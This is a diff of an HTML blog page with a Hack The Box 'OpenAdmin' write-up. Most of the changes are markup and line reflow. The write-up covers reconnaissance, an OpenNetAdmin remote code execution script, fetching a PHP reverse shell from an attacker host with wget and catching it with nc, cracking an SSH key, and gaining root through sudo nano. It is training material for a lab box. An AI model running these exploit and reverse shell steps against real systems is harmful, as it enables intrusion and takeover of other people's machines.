@@ -6,30 +6,32 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
-<title>Hackthebox - OpenAdmin Writeup &mdash; fmash16's blog</title>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - OpenAdmin
+Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - OpenAdmin Writeup" />
       <meta property="og:description" content=""Difficulty " />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_openadmin/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_openadmin/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,25 +41,31 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox---openadmin-writeup">Hackthebox - OpenAdmin Writeup</a>
-    <ul>
-    <li><a href="#directory-searching-with-gobuster">## Directory searching with Gobuster:</a></li>
-    <li><a href="#enumeration">## Enumeration</a></li>
-    </ul></li>
-    </ul>
-</nav>
-<h1 id="hackthebox---openadmin-writeup">Hackthebox - OpenAdmin Writeup</h1>
-<p><img src="/img/htb_openadmin/card.png" /> # Initial Foothold - Getting www-data shell using exploit — ## Nmap scan — Interesting ports:</p>
 <ul>
-<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
-<li>80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works</li>
+<li><a href="#hackthebox---openadmin-writeup">Hackthebox - OpenAdmin
+Writeup</a>
+<ul>
+<li><a href="#directory-searching-with-gobuster">## Directory searching
+with Gobuster:</a></li>
+<li><a href="#enumeration">## Enumeration</a></li>
+</ul></li>
 </ul>
-<p>We have a look at the webpage and we find a default apache webpage.</p>
-<h2 id="directory-searching-with-gobuster">## Directory searching with Gobuster:</h2>
+<h1 id="hackthebox---openadmin-writeup">Hackthebox - OpenAdmin
+Writeup</h1>
+<p><img src="/img/htb_openadmin/card.png" /> # Initial Foothold -
+Getting www-data shell using exploit — ## Nmap scan — Interesting
+ports:</p>
+<ul>
+<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;
+protocol 2.0)</li>
+<li>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2
+Ubuntu Default Page: It works</li>
+</ul>
+<p>We have a look at the webpage and we find a default apache
+webpage.</p>
+<h2 id="directory-searching-with-gobuster">## Directory searching with
+Gobuster:</h2>
 <p>We now search for any web directories using gobuster</p>
 <p><img src="/img/htb_openadmin/1.png" /></p>
 <p>We find two folders:</p>
@@ -65,13 +73,19 @@
 <li>/music</li>
 <li>/artwork</li>
 </ul>
-<p>Going into the /music directory, we find a webpage with login option</p>
+<p>Going into the /music directory, we find a webpage with login
+option</p>
 <p><img src="/img/htb_openadmin/2.png" /></p>
 <p>  ## Foothold</p>
-<p>Going into the login, we get an OpenNetAdmin login page at the address http://10.10.10.171/ona/</p>
+<p>Going into the login, we get an OpenNetAdmin login page at the
+address http://10.10.10.171/ona/</p>
 <p><img src="/img/htb_openadmin/3.png" /></p>
-<p>  ## Exploit — Searching for exploits for OpenNetAdmin, we find a remote code execution vulnerability on exploit-db. (https://www.exploit-db.com/exploits/47691) We download the exploit and change it according to our needs.</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /bin/bash</span></span>
+<p>  ## Exploit — Searching for exploits for OpenNetAdmin, we find a
+remote code execution vulnerability on exploit-db.
+(https://www.exploit-db.com/exploits/47691) We download the exploit and
+change it according to our needs.</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /bin/bash</span></span>
 <span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="va">URL</span><span class="op">=</span><span class="st">&quot;</span><span class="va">${1}</span><span class="st">&quot;</span></span>
 <span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span><span class="cf">do</span></span>
@@ -84,7 +98,8 @@
 <p>We run the exploit to get a web shell</p>
 <p><img src="/img/htb_openadmin/5.png" /></p>
 <p>We try getting a reverse shell to get a more interactive shell.</p>
-<p>We get the php reverse shell from pentest monkey and upload it to the box using wget using the remote command execution vulnerability</p>
+<p>We get the php reverse shell from pentest monkey and upload it to the
+box using wget using the remote command execution vulnerability</p>
 <p>On host:</p>
 <pre><code># wget
 https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php
@@ -92,11 +107,13 @@ https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.
 # nc -lnvp 1234</code></pre>
 <p>On target:</p>
 <pre><code>$ wget http://10.10.15.175:8000/php-reverse-shell.php</code></pre>
-<p>Then we get our reverse shell going to the url http:/10.10.10.171/ona/php-reverse-shell.php</p>
+<p>Then we get our reverse shell going to the url
+http:/10.10.10.171/ona/php-reverse-shell.php</p>
 <p>And we get our reverse shell</p>
 <p><img src="/img/htb_openadmin/6.png" /></p>
 <p>  # Privilege Escalation - User: —</p>
-<p>From the reverse shell, we see that the banner prints out some info about the machine. We find:</p>
+<p>From the reverse shell, we see that the banner prints out some info
+about the machine. We find:</p>
 <ul>
 <li>Running Ubuntu</li>
 <li>Two users:
@@ -105,36 +122,48 @@ https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.
 <li>jimmy</li>
 </ol></li>
 </ul>
-<p>  ## Enumeration — We look around the /opt/www/ona directory and find a database config file which gives us a password.</p>
+<p>  ## Enumeration — We look around the /opt/www/ona directory and find
+a database config file which gives us a password.</p>
 <p><img src="/img/htb_openadmin/7.png" /></p>
 <p>We find the password <strong>n1nj4W4rri0R!</strong></p>
-<p>We try it with both the users and find that it is the password for jimmy. We use the creds to ssh into the box as jimmy.</p>
+<p>We try it with both the users and find that it is the password for
+jimmy. We use the creds to ssh into the box as jimmy.</p>
 <p><img src="/img/htb_openadmin/8.png" /></p>
-<p>But it does not have the user.txt file. So this is not our required user.</p>
-<p>  ## Escalation to user joanna: — ### Enumeration (port 52846) — We run linpeas.sh on the target and found 2 open ports</p>
+<p>But it does not have the user.txt file. So this is not our required
+user.</p>
+<p>  ## Escalation to user joanna: — ### Enumeration (port 52846) — We
+run linpeas.sh on the target and found 2 open ports</p>
 <ul>
 <li>52846</li>
 <li>3306</li>
 </ul>
-<p>connecting to the port 52846 using curl, we get an html response. Now, we look into the var/www directory and find the directory internal, that contains an intersting file main.php</p>
+<p>connecting to the port 52846 using curl, we get an html response.
+Now, we look into the var/www directory and find the directory internal,
+that contains an intersting file main.php</p>
 <p>  <img src="/img/htb_openadmin/9.png" /></p>
 <p>So we see that it prints out the id_rsa of the user joanna.</p>
-<p>We curl the url <code>127.0.0.1:52846/main.php</code> and get the id_rsa of the user joanna</p>
+<p>We curl the url <code>127.0.0.1:52846/main.php</code> and get the
+id_rsa of the user joanna</p>
 <p><img src="/img/htb_openadmin/10.png" /></p>
 <p>We copy the file to our local machine and crack it with john</p>
 <p>  ### id_rsa crack with john —</p>
-<p>Trying to login with the private key, we find that it requires a passphrase</p>
+<p>Trying to login with the private key, we find that it requires a
+passphrase</p>
 <p><img src="/img/htb_openadmin/11.png" /></p>
 <p>So, we crack the pass phrase using john</p>
 <p><img src="/img/htb_openadmin/12.png" /></p>
-<p>We use the cracked passphrase to ssh into user joanna and get the user.txt</p>
+<p>We use the cracked passphrase to ssh into user joanna and get the
+user.txt</p>
 <p><img src="/img/htb_openadmin/13.png" /></p>
 <p>  # Privilege Escalation - Root: —</p>
 <h2 id="enumeration">## Enumeration</h2>
-<p>We find that our user joanna is allowed to run the following command as sudo</p>
+<p>We find that our user joanna is allowed to run the following command
+as sudo</p>
 <p><img src="/img/htb_openadmin/14.png" /></p>
 <p>  ## Escalation —</p>
-<p>We run the command and get a nano editor running as root. We can spawn a root shell from the nano, following the commands found in <a href="https://gtfobins.github.io/gtfobins/nano/#sudo">GTFObins</a></p>
+<p>We run the command and get a nano editor running as root. We can
+spawn a root shell from the nano, following the commands found in <a
+href="https://gtfobins.github.io/gtfobins/nano/#sudo">GTFObins</a></p>
 <p>Commnads:</p>
 <pre><code>nano
 ^R^X
